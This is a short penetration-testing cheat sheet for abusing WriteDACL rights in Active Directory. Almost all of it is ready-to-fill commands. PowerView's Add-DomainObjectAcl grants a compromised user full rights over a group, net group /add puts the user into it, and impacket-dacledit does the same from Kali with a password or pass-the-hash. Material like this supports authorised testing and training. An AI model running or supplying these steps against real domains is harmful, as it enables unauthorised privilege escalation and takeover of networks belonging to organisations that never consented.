This attack will allow us to add our compromised user to another group.

> We can do this on the compromised machine using PowerView or from kali. From the machine:

```
Add-DomainObjectAcl -TargetIdentity '<groupname>' -PrincipalIdentity <user> -Rights All -Domain '<domain>'
```

> Then we can verify it was done:

```
Get-DomainObjectAcl -Identity '<groupname>' -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser <user>).SID}
```

> Now add the compromised user into the group they have writeDACL over:

```
net group "<group>" <user> /add /domain
```

If we want to do it on kali, first we give fullcontrol over the target group then add compromsied user into the group.

> With hash:

```
impacket-dacledit -hashes :<hash> -action 'write' -rights 'FullControl' -principal "<currentgroup>" -target '<groupname>' "<domain>/<user>" -dc-ip <ip>
```

> With password:

```
impacket-dacledit -action 'write' -rights 'FullControl' -principal "<currentgroup>" -target '<groupname>' "<domain>/<user>:<password>" -dc-ip <ip>
```

Now add the user to the group.

> With hash:

```
impacket-dacledit -hashes :<hash> -action 'write' -rights 'WriteMembers' -principal '<user>' -target '<groupname>' "<domain>/<user>" -dc-ip <ip>
```

> With password:

```
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal '<user>' -target '<groupname>' "<domain>/<user>:<pass>" -dc-ip <ip>
```

